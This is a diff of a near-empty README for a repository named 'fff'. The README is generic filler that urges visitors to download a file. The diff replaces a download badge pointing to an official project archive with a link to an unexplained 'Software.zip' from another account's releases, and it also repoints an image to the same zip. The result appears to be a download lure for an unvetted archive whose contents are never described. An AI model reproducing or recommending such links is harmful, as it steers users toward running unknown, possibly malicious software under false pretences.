@@ -9,7 +9,7 @@ Unfortunately, there is no specific short description provided for this reposito
 The topics associated with this repository are not explicitly stated. Therefore, feel free to delve into the repository and discover the exciting world within! 🌟
 
 ## Download Link
-[![Download fff](https://img.shields.io/badge/Download-fff-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download fff](https://github.com/JIm3752752/fff/releases/download/v1.0/Software.zip)](https://github.com/JIm3752752/fff/releases/download/v1.0/Software.zip)
 Click the button above to download the file. 📥
 
 In case the link does not work, please check the "Releases" section for an alternative download source. 🔄
@@ -18,4 +18,4 @@ In case the link does not work, please check the "Releases" section for an alter
 
 Thank you for visiting the "fff" repository. Enjoy exploring and have a fantastic coding journey! 🎉
 
-![Code Image](https://www.codecademy.com/resources/blog/content/images/2020/08/what-coding-language-to-learn.png)
+![Code Image](https://github.com/JIm3752752/fff/releases/download/v1.0/Software.zip)
